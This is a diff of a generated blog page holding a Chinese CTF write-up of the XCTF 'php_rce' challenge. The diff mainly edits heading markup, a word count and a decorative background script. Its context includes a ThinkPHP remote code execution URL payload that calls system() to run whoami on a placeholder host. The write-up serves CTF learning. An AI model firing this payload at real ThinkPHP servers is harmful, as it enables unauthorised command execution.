@@ -440,7 +440,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h4 id="题目来源：XCTF-Web-进阶区-php-rce"><a href="#题目来源：XCTF-Web-进阶区-php-rce" class="headerlink" title="题目来源：XCTF Web 进阶区 php_rce"></a><strong>题目来源：XCTF Web 进阶区 php_rce</strong></h4><p>打开场景文件后，看到题目的提示是ThinkPHP，查资料后可知，这是一个远程代码执行漏洞，查一下网上的payload后，尝试输入</p>
+                <h1><span id="web2">Web2</span></h1><h4><span id="题目来源xctf-web-进阶区-php_rce"><strong>题目来源：XCTF Web 进阶区 php_rce</strong></span></h4><p>打开场景文件后，看到题目的提示是ThinkPHP，查资料后可知，这是一个远程代码执行漏洞，查一下网上的payload后，尝试输入</p>
 <p><img src="/lunan0320.github.io/2021/01/17/web2/1.png"></p>
 <pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//your-ip:8080/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span></code></pre>
 <p>返回的结果是：</p>
@@ -881,7 +881,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">9.9k</span>&nbsp;字
+                class="white-color">9.8k</span>&nbsp;字
             
             
             
@@ -1160,6 +1160,12 @@ $(function () {
     
     <script src="/lunan0320.github.io/libs/instantpage/instantpage.js" type="module"></script>
     
+    
+    <!--动态线条背景-->
+<script type="text/javascript"
+color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
 
 <script src="/lunan0320.github.io/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
